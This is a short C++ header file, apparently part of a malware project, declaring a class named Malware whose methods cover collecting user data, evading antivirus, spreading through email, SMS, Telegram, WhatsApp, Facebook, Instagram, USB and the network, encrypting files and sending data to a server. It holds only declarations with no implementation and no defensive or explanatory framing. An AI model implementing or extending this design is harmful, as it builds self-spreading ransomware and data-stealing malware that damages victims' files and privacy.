#ifndef HUB_H
#define HUB_H

#include <string>
#include "BotManager.h"
#include "BotScheduler.h"

class Malware {
public:
    Malware(const std::string &configFilePath);
    void execute();

private:
    std::string configFilePath;

    void collectUserData();
    void hideFromAntivirus();
    void logActivity(const std::string &activity);
    void selfSpread();
    void spreadViaEmail();
    void spreadViaSMS();
    void spreadViaTelegram();
    void spreadViaWhatsApp();
    void spreadViaFacebook();
    void spreadViaInstagram();
    void spreadViaUSB();
    void spreadViaNetwork();
    void encryptFiles(const std::string &directory);
    std::string encrypt(const std::string &data);
    void sendToServer(const std::string &data);
    bool shouldStopExecution();
    void sleepRandomTime();
    void scheduleInitialTasks(BotManager &botManager, BotScheduler &botScheduler);
};

#endif // HUB_H











